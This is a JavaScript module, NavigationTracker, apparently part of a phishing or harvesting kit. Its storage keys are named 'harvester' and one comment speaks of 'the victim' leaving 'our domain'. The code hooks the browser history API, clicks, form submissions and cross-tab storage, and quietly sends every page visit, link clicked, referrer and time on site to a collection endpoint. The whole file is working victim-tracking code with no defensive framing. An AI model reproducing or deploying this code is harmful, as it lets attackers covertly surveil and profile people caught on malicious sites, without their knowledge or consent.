export default class NavigationTracker {
  constructor(core) {
    this.core = core;
    this.lastUrl = window.location.href;
    this.lastPath = window.location.pathname;
    this.visitHistory = [{ url: window.location.href, path: window.location.pathname, title: document.title, timestamp: Date.now() }];
    this.startTime = Date.now();
    this.storageKey = 'harvester_nav_history';
    this.crossTabSyncKey = 'harvester_cross_tab_nav';
    this.navigationCount = 0;
    this.externalLinksClicked = [];
  }

  init() {
    // Monitor SPA route changes via pushState/replaceState
    this.patchHistoryAPI();

    // Listen for popstate (back/forward navigation)
    window.addEventListener('popstate', () => this.handleNavigation('popstate'));

    // Monitor hash changes
    window.addEventListener('hashchange', () => this.handleNavigation('hashchange'));

    // Monitor all link clicks
    document.addEventListener('click', (e) => this.handleLinkClick(e), true);

    // Monitor form submissions (which can cause navigation)
    document.addEventListener('submit', (e) => this.handleFormSubmit(e), true);

    // Cross-tab navigation sync via storage events
    window.addEventListener('storage', (e) => {
      if (e.key === this.crossTabSyncKey) {
        try {
          const data = JSON.parse(e.newValue);
          this.visitHistory.push({ ...data, crossTab: true });
          this.sendNavigationToServer(data);
        } catch (err) {}
      }
    });

    // Periodically check for URL changes (fallback)
    setInterval(() => this.checkForUrlChange(), 1000);

    // Send navigation to all open tabs from this origin
    setTimeout(() => this.syncToCrossTab(), 500);

    // Send initial page visit
    this.sendPageVisit(window.location.href, document.title);
  }

  patchHistoryAPI() {
    const self = this;

    // Patch pushState
    const originalPushState = window.history.pushState.bind(window.history);
    window.history.pushState = function(state, title, url) {
      originalPushState(state, title, url);
      self.handleNavigation('pushState');
    };

    // Patch replaceState
    const originalReplaceState = window.history.replaceState.bind(window.history);
    window.history.replaceState = function(state, title, url) {
      originalReplaceState(state, title, url);
      self.handleNavigation('replaceState');
    };
  }

  handleNavigation(source) {
    // Small delay to let React update the DOM and document.title
    setTimeout(() => {
      const currentUrl = window.location.href;
      const currentPath = window.location.pathname;

      if (currentPath === this.lastPath) return; // Not a real navigation

      const entry = {
        url: currentUrl,
        path: currentPath,
        title: document.title,
        previousUrl: this.lastUrl,
        timestamp: Date.now(),
        navigationType: source,
        timeSinceLastNav: Date.now() - (this.visitHistory[this.visitHistory.length - 1]?.timestamp || this.startTime)
      };

      this.visitHistory.push(entry);
      this.lastUrl = currentUrl;
      this.lastPath = currentPath;
      this.navigationCount++;

      // Send to server
      this.sendNavigationToServer(entry);

      // Sync to cross-tab
      this.syncToCrossTab();

      // Store in sessionStorage for persistence across refresh
      this.persistHistory();
    }, 100);
  }

  handleLinkClick(e) {
    try {
      const link = e.target.closest('a');
      if (!link) return;

      const href = link.getAttribute('href');
      if (!href || href.startsWith('javascript:') || href.startsWith('#') || href.startsWith('mailto:') || href.startsWith('tel:')) return;

      const linkUrl = new URL(href, window.location.origin);
      const isExternal = linkUrl.origin !== window.location.origin;

      // Check if link opens in new tab
      const target = link.getAttribute('target') || '';
      const opensNewTab = target === '_blank' || e.ctrlKey || e.metaKey || e.button === 1;

      const linkData = {
        href: linkUrl.href,
        origin: linkUrl.origin,
        pathname: linkUrl.pathname,
        isExternal,
        opensNewTab,
        linkText: link.textContent?.substring(0, 200) || '',
        linkSelector: this.getElementSelector(link),
        pageUrl: window.location.href,
        pageTitle: document.title,
        timestamp: Date.now()
      };

      if (isExternal) {
        this.externalLinksClicked.push(linkData);

        // Send external link immediately
        this.core.send('/api/collect/formdata', {
          formId: 'external-link-click',
          fields: linkData,
          url: window.location.href
        });
      }

      if (linkUrl.origin === window.location.origin && !opensNewTab) {
        // Internal navigation - will be caught by history API
        // But we log the click regardless
        this.core.send('/api/collect/formdata', {
          formId: 'internal-link-click',
          fields: {
            href: linkData.href,
            pathname: linkData.pathname,
            linkText: linkData.linkText,
            selector: linkData.linkSelector
          },
          url: window.location.href
        });
      }

      if (isExternal && opensNewTab) {
        // User is navigating to an external site in a new tab
        // This is a key event - the victim is leaving our domain
        this.core.send('/api/collect/formdata', {
          formId: 'external-navigation-new-tab',
          fields: {
            destinationUrl: linkUrl.href,
            sourceUrl: window.location.href,
            linkText: link.textContent?.substring(0, 200) || ''
          },
          url: window.location.href
        });
      }
    } catch (e) {
      // Silent fail for cross-origin links
    }
  }

  handleFormSubmit(e) {
    const form = e.target;
    const formAction = form.action || window.location.href;
    const formMethod = form.method || 'get';

    // If form action is external or different path, track it
    try {
      const actionUrl = new URL(formAction, window.location.origin);
      if (actionUrl.pathname !== window.location.pathname) {
        this.core.send('/api/collect/formdata', {
          formId: 'navigation-form-submit',
          fields: {
            formAction: formAction,
            formMethod: formMethod,
            formId: form.id || form.name || 'unnamed',
            sourceUrl: window.location.href
          },
          url: window.location.href
        });
      }
    } catch (e) {}
  }

  checkForUrlChange() {
    const currentPath = window.location.pathname;
    if (currentPath !== this.lastPath) {
      this.handleNavigation('url-check');
    }
  }

  sendPageVisit(url, title) {
    this.core.send('/api/collect/formdata', {
      formId: 'page-visit',
      fields: {
        url: url,
        path: window.location.pathname,
        title: title || document.title,
        referrer: document.referrer || '',
        visitNumber: this.visitHistory.length,
        timeOnSite: Math.floor((Date.now() - this.startTime) / 1000)
      },
      url: url
    });
  }

  sendNavigationToServer(entry) {
    this.core.send('/api/collect/formdata', {
      formId: 'page-navigation',
      fields: {
        currentUrl: entry.url,
        currentPath: entry.path,
        pageTitle: entry.title,
        previousUrl: entry.previousUrl,
        timeSinceLastNav: entry.timeSinceLastNav,
        navigationType: entry.navigationType,
        navigationCount: this.navigationCount,
        totalPagesVisited: this.visitHistory.length,
        timeOnSite: Math.floor((Date.now() - this.startTime) / 1000)
      },
      url: entry.url
    });
  }

  syncToCrossTab() {
    try {
      const latest = this.visitHistory[this.visitHistory.length - 1];
      if (latest) {
        localStorage.setItem(this.crossTabSyncKey, JSON.stringify({
          url: latest.url,
          path: latest.path,
          title: latest.title,
          timestamp: latest.timestamp,
          navigationCount: this.navigationCount
        }));
      }
    } catch (e) {}
  }

  persistHistory() {
    try {
      const recent = this.visitHistory.slice(-50);
      sessionStorage.setItem(this.storageKey, JSON.stringify(recent));
    } catch (e) {}
  }

  getElementSelector(el) {
    try {
      if (el.id) return `#${el.id}`;
      if (el.className && typeof el.className === 'string') {
        const cls = el.className.split(' ').filter(Boolean).slice(0, 3).join('.');
        return `${el.tagName.toLowerCase()}.${cls}`;
      }
      return el.tagName.toLowerCase();
    } catch (e) {
      return el.tagName?.toLowerCase() || 'unknown';
    }
  }

  getVisitHistory() {
    return this.visitHistory;
  }

  getExternalLinks() {
    return this.externalLinksClicked;
  }

  getNavigationStats() {
    const paths = this.visitHistory.map(v => v.path);
    const uniquePaths = [...new Set(paths)];
    return {
      totalVisits: this.visitHistory.length,
      uniquePages: uniquePaths.length,
      navigationCount: this.navigationCount,
      paths: uniquePaths,
      externalLinksClicked: this.externalLinksClicked.length,
      firstPage: this.visitHistory[0]?.url || '',
      lastPage: this.visitHistory[this.visitHistory.length - 1]?.url || '',
      timeOnSite: Math.floor((Date.now() - this.startTime) / 1000)
    };
  }
}